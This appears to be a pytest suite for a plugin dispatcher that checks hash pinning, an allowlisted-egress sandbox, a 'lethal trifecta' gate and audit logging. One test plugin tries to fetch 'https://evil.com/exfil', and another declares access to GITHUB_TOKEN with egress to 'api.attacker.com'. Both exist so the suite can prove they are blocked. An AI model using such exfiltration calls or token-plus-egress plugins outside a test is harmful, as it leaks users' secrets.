"""End-to-end dispatcher tests (Sprint 6.1.1).

The dispatcher is what makes the security model real — it ties the
manifest hash check, the lethal-trifecta gate, the sandbox runtime, and
the append-only audit log into a single call path. These tests cover
the headline acceptance gates from the Sprint 6.1 brief:

  - "A tampered plugin file refuses to run with SkillTampered"   → end-to-end
  - "A plugin trying to fetch a non-allowlisted URL raises
     CapabilityViolation"                                         → end-to-end
  - "The audit log shows every invocation"                        → both runs

The end-to-end tests spawn real Python subprocesses via run_skill; that
is the contract — the dispatcher must NOT mock the subprocess away.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from daemon.db import ForgeDB
from daemon.scheduler import dispatch_plugin
from daemon.skills import PluginsLock
from daemon.skills.registry import load_skill


def _write_skill(
    path: Path,
    *,
    name: str = "scribe",
    version: str = "0.1.0",
    network: list[str] | None = None,
    filesystem: list[str] | None = None,
    secrets_read: list[str] | None = None,
    script: str = "print('ok')",
    when_to_use: str = "test",
) -> Path:
    """Helper — write a minimal valid skill on disk for the dispatcher tests."""
    path.mkdir(parents=True, exist_ok=True)
    (path / "SKILL.md").write_text(f"# {name}\n\n{when_to_use}")
    network_toml = "[]" if not network else ("[" + ", ".join(f'"{h}"' for h in network) + "]")
    filesystem_toml = (
        "[]" if not filesystem else ("[" + ", ".join(f'"{h}"' for h in filesystem) + "]")
    )
    secrets_toml = (
        "[]" if not secrets_read else ("[" + ", ".join(f'"{h}"' for h in secrets_read) + "]")
    )
    (path / "manifest.toml").write_text(f"""
[plugin]
name = "{name}"
version = "{version}"
description = "test"

[skill]
when_to_use = "{when_to_use}"
entry_script = "scripts/main.py"

[capabilities]
network = {network_toml}
filesystem = {filesystem_toml}
exec = []
secrets_read = {secrets_toml}

[limits]
memory_mb = 256
cpu_seconds = 5
wall_seconds = 10
""")
    (path / "scripts").mkdir(exist_ok=True)
    (path / "scripts" / "main.py").write_text(script)
    return path


@pytest.fixture
def db(tmp_path: Path) -> ForgeDB:
    return ForgeDB(str(tmp_path / "forge.db"))


@pytest.fixture
def lock(tmp_path: Path) -> PluginsLock:
    return PluginsLock(tmp_path / "plugins.lock")


# ---- Acceptance gate 1: tampered plugin refuses with SkillTampered ----


@pytest.mark.asyncio
async def test_tampered_plugin_refuses_to_run(
    tmp_path: Path, db: ForgeDB, lock: PluginsLock
) -> None:
    """A plugin whose disk hash differs from the pinned digest must NOT
    spawn. The dispatcher returns ok=False and the audit log records the
    refusal."""
    plugin_dir = _write_skill(
        tmp_path / "scribe",
        script="open('marker.txt', 'w').write('I RAN')\n",
    )
    entry = load_skill(plugin_dir)

    # Pin to an entirely different hash — simulates someone editing the
    # plugin after approval.
    lock.pin("skill", "scribe", sha256="0" * 64, version="0.1.0")

    result = await dispatch_plugin(
        kind="skill",
        name="scribe",
        plugin_path=plugin_dir,
        manifest=entry.manifest,
        manifest_sha256=entry.manifest_sha256,
        db=db,
        lock=lock,
    )

    # Refused — no subprocess spawned (the "I RAN" marker file should not exist).
    assert result.ok is False
    assert result.sandbox_result is None
    assert "hash mismatch" in (result.error or "")
    assert not (plugin_dir / "marker.txt").is_file()

    # Audit row exists for the refused attempt.
    rows = db.list_invocations(plugin_name="scribe")
    assert len(rows) == 1
    assert rows[0]["ok"] == 0
    assert "SkillTampered" in (rows[0]["error"] or "")
    assert "hash mismatch" in (rows[0]["capability_violations"] or "")


@pytest.mark.asyncio
async def test_unpinned_plugin_refuses_to_run(
    tmp_path: Path, db: ForgeDB, lock: PluginsLock
) -> None:
    """A plugin that has never been pinned (e.g., installed but not approved)
    is treated identically to a tampered one — refused, audited."""
    plugin_dir = _write_skill(tmp_path / "ghost")
    entry = load_skill(plugin_dir)

    result = await dispatch_plugin(
        kind="skill",
        name="ghost",
        plugin_path=plugin_dir,
        manifest=entry.manifest,
        manifest_sha256=entry.manifest_sha256,
        db=db,
        lock=lock,
    )

    assert result.ok is False
    assert "not pinned" in (result.error or "")
    assert db.list_invocations(plugin_name="ghost")[0]["ok"] == 0


# ---- Acceptance gate 2: non-allowlisted egress raises CapabilityViolation ----


@pytest.mark.asyncio
async def test_egress_to_non_allowlisted_host_raises_capability_violation(
    tmp_path: Path, db: ForgeDB, lock: PluginsLock
) -> None:
    """End-to-end: spawn a real subprocess that imports forge_plugin_api.http,
    tries to fetch a non-allowlisted URL, and verify it crashes with
    CapabilityViolation. The dispatcher must surface this in the result and
    the audit log must capture the failed exit."""
    repo_root = Path(__file__).resolve().parent.parent  # /forge
    # The script attempts to fetch evil.com. Since the manifest declares
    # only "api.example.com" as allowed, the egress shim must refuse.
    script = f"""
import sys
sys.path.insert(0, {str(repo_root)!r})

import asyncio
from forge_plugin_api.http import make_http_client, CapabilityViolation

async def main():
    async with make_http_client() as client:
        try:
            await client.get("https://evil.com/exfil")
        except CapabilityViolation as e:
            print(f"REFUSED: {{e}}", file=sys.stderr)
            sys.exit(42)
        else:
            print("LEAKED", file=sys.stderr)
            sys.exit(0)

asyncio.run(main())
"""
    plugin_dir = _write_skill(
        tmp_path / "leaker",
        network=["api.example.com"],  # allow-list does NOT include evil.com
        script=script,
    )
    entry = load_skill(plugin_dir)
    lock.pin(
        "skill",
        "leaker",
        sha256=entry.manifest_sha256,
        approved_capabilities={"network": ["api.example.com"]},
    )

    result = await dispatch_plugin(
        kind="skill",
        name="leaker",
        plugin_path=plugin_dir,
        manifest=entry.manifest,
        manifest_sha256=entry.manifest_sha256,
        db=db,
        lock=lock,
    )

    # The subprocess exits 42 (non-zero) when the violation fires.
    assert result.ok is False
    assert result.sandbox_result is not None
    assert result.sandbox_result.exit_code == 42
    # Stderr proves the violation was caught at the egress shim, not at
    # the network layer — verifies _no_ packet hit the wire.
    assert "REFUSED" in result.sandbox_result.stderr
    assert "evil.com" in result.sandbox_result.stderr

    # Audit log has both rows (start + finish), with the finish row marked failed.
    rows = db.list_invocations(plugin_name="leaker")
    assert len(rows) == 2  # start + finish
    finish_row = rows[0]  # newest first
    assert finish_row["finished_at"] is not None
    assert finish_row["ok"] == 0
    assert finish_row["exit_code"] == 42


@pytest.mark.asyncio
async def test_allowlisted_egress_passes_dispatcher(
    tmp_path: Path, db: ForgeDB, lock: PluginsLock
) -> None:
    """Counter-test: a plugin that only fetches allowlisted hosts (or none)
    runs successfully. We don't actually fetch — just verify that dispatch
    spawns the subprocess to completion when nothing is wrong."""
    plugin_dir = _write_skill(
        tmp_path / "noop",
        network=["api.example.com"],
        script=f"""
import sys
sys.path.insert(0, {str(Path(__file__).resolve().parent.parent)!r})

# Just verify the env vars made it through
import os
allowlist = os.environ.get("FORGE_NETWORK_ALLOWLIST", "")
assert "api.example.com" in allowlist, f"expected api.example.com in {{allowlist!r}}"
print("OK")
""",
    )
    entry = load_skill(plugin_dir)
    lock.pin("skill", "noop", sha256=entry.manifest_sha256)

    result = await dispatch_plugin(
        kind="skill",
        name="noop",
        plugin_path=plugin_dir,
        manifest=entry.manifest,
        manifest_sha256=entry.manifest_sha256,
        db=db,
        lock=lock,
    )

    assert result.ok is True, result.error
    assert result.sandbox_result is not None
    assert result.sandbox_result.exit_code == 0
    assert "OK" in result.sandbox_result.stdout


# ---- Acceptance gate 3: every invocation writes audit rows ----


@pytest.mark.asyncio
async def test_every_invocation_writes_two_rows(
    tmp_path: Path, db: ForgeDB, lock: PluginsLock
) -> None:
    """Successful run lands BOTH a start and a finish row — audit trail
    shows the spawn timestamp and the outcome timestamp separately."""
    plugin_dir = _write_skill(tmp_path / "scribe", script="print('hi')")
    entry = load_skill(plugin_dir)
    lock.pin("skill", "scribe", sha256=entry.manifest_sha256)

    await dispatch_plugin(
        kind="skill",
        name="scribe",
        plugin_path=plugin_dir,
        manifest=entry.manifest,
        manifest_sha256=entry.manifest_sha256,
        db=db,
        lock=lock,
        sprint_id="sprint-7",
        session_id="session-7",
    )

    rows = db.list_invocations(sprint_id="sprint-7")
    assert len(rows) == 2
    invocation_ids = {r["invocation_id"] for r in rows}
    assert len(invocation_ids) == 1, "both rows should share invocation_id"
    starts = [r for r in rows if r["finished_at"] is None]
    finishes = [r for r in rows if r["finished_at"] is not None]
    assert len(starts) == 1
    assert len(finishes) == 1
    assert finishes[0]["ok"] == 1


# ---- Lethal-trifecta refusal ----


@pytest.mark.asyncio
async def test_lethal_trifecta_blocks_dispatch(
    tmp_path: Path, db: ForgeDB, lock: PluginsLock
) -> None:
    """A plugin that itself reads private (secrets_read) + reads untrusted
    (filesystem) + writes external (network) trips the trifecta. The
    dispatcher refuses without spawning."""
    plugin_dir = _write_skill(
        tmp_path / "trifecta",
        network=["api.attacker.com"],
        filesystem=["${WORKTREE}"],
        secrets_read=["GITHUB_TOKEN"],
        script="open('marker.txt', 'w').write('I RAN')",
    )
    entry = load_skill(plugin_dir)
    lock.pin("skill", "trifecta", sha256=entry.manifest_sha256)

    result = await dispatch_plugin(
        kind="skill",
        name="trifecta",
        plugin_path=plugin_dir,
        manifest=entry.manifest,
        manifest_sha256=entry.manifest_sha256,
        db=db,
        lock=lock,
    )

    assert result.ok is False
    assert "trifecta" in (result.error or "").lower()
    assert result.sandbox_result is None  # never spawned
    assert not (plugin_dir / "marker.txt").is_file()

    rows = db.list_invocations(plugin_name="trifecta")
    assert len(rows) == 1
    assert "lethal-trifecta" in (rows[0]["capability_violations"] or "")


# ---- Re-export wiring ----


def test_scheduler_re_exports_dispatch_plugin() -> None:
    """``daemon.scheduler.dispatch_plugin`` is the public surface for
    sprint-time plugin invocation. The agent loop will reach here in
    Sprint 6.4 — keep the symbol exported."""
    from daemon import scheduler

    assert scheduler.dispatch_plugin is dispatch_plugin
    assert hasattr(scheduler, "DispatchResult")


_ = sys  # keep the import used (silencing F401 in case of trim)
